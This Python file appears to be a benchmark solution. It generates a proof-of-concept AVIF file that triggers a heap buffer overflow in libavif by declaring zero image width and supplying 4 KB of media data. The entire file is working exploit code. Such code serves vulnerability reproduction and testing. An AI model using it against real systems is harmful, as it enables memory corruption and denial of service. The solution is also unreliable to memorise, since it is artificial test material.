import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overflow in libavif (oss-fuzz:42536646).

        The vulnerability is triggered by an AVIF file with an image width or height of 0.
        The libavif code fails to validate image dimensions, leading to a
        zero-sized or small allocation for image planes. When the decoder then tries
        to write image data from the 'mdat' box into these planes, a heap buffer
        overflow occurs.

        This PoC constructs a minimal but structurally valid AVIF file with the
        following key features:
        1. An 'ispe' (Image Spatial Extent) box specifying width=0 and height=1.
        2. An 'mdat' (Media Data) box containing arbitrary data. The presence
           of this data ensures that a write operation is attempted on the
           incorrectly-sized buffer, triggering the overflow. A size of a few
           kilobytes is chosen to ensure a significant overflow that is easily
           detected by AddressSanitizer.
        """

        def box(box_type: bytes, content: bytes) -> bytes:
            """Creates a standard ISOBMFF box."""
            return struct.pack('>I', len(content) + 8) + box_type + content

        def full_box(box_type: bytes, version: int, flags: int, content: bytes) -> bytes:
            """Creates an ISOBMFF full box (with version and flags)."""
            header = struct.pack('B', version) + struct.pack('>I', flags)[1:]
            return box(box_type, header + content)

        # ---- File Type Box ('ftyp') ----
        ftyp_box = box(b'ftyp', b'avif\x00\x00\x00\x00avifmif1')

        # ---- Media Data Box ('mdat') ----
        # Contains data that will overflow the buffer. 4KB is sufficient.
        mdat_content = b'\x41' * 4096
        mdat_box = box(b'mdat', mdat_content)

        # ---- Meta Box ('meta') and its contents ----

        # Handler Reference Box ('hdlr')
        hdlr_content = b'\x00\x00\x00\x00' + b'pict' + b'\x00' * 12 + b'PoC\x00'
        hdlr_box = full_box(b'hdlr', 0, 0, hdlr_content)

        # Primary Item Reference Box ('pitm')
        pitm_box = full_box(b'pitm', 0, 0, struct.pack('>H', 1))

        # Item Info Box ('iinf') with one Item Info Entry ('infe')
        infe_content = struct.pack('>H', 1) + b'\x00\x00' + b'av01' + b'frame\x00'
        infe_box = full_box(b'infe', 2, 0, infe_content)
        iinf_box = full_box(b'iinf', 0, 0, struct.pack('>H', 1) + infe_box)

        # Item Properties Box ('iprp')
        #   Image Spatial Extent ('ispe') - THE VULNERABLE PART (width=0)
        ispe_box = full_box(b'ispe', 0, 0, struct.pack('>II', 0, 1))
        #   AV1 Configuration Box ('av1C')
        av1c_box = box(b'av1C', b'\x81\x0a\x0c\x00')
        #   Item Property Container ('ipco')
        ipco_box = box(b'ipco', ispe_box + av1c_box)
        #   Item Property Association ('ipma')
        ipma_content = (
            struct.pack('>I', 1) +      # entry_count
            struct.pack('>H', 1) +      # item_ID
            struct.pack('B', 2) +       # association_count
            struct.pack('B', 0x81) +    # property_index 1 (ispe), essential
            struct.pack('B', 0x82)      # property_index 2 (av1C), essential
        )
        ipma_box = full_box(b'ipma', 0, 0, ipma_content)
        iprp_box = box(b'iprp', ipco_box + ipma_box)

        # Item Location Box ('iloc')
        # Must be built after other boxes to calculate data offsets.
        # First, calculate the final size of the meta box.
        meta_content_without_iloc = hdlr_box + pitm_box + iinf_box + iprp_box
        # Our iloc box has a fixed size: content(20 bytes) + header(12 bytes) = 32 bytes
        iloc_box_size = 32
        meta_box_size = len(meta_content_without_iloc) + iloc_box_size + 12

        mdat_data_offset = len(ftyp_box) + meta_box_size + 8  # +8 for mdat box header
        mdat_data_length = len(mdat_content)

        # Now, construct the final 'iloc' box with correct offsets.
        # v0, offset_size=4, length_size=4, base_offset_size=0
        iloc_content = (
            struct.pack('>BB', 0x44, 0x00) +              # sizes
            struct.pack('>H', 1) +                       # item_count
            struct.pack('>HHHH', 1, 0, 0, 1) +           # item (id, method, ref_idx, extent_count)
            struct.pack('>II', mdat_data_offset, mdat_data_length) # extent
        )
        iloc_box = full_box(b'iloc', 0, 0, iloc_content)

        # Assemble the final 'meta' box.
        meta_content = hdlr_box + pitm_box + iinf_box + iloc_box + iprp_box
        meta_box = full_box(b'meta', 0, 0, meta_content)
        
        # Assemble the final PoC file.
        poc = ftyp_box + meta_box + mdat_box
        return poc
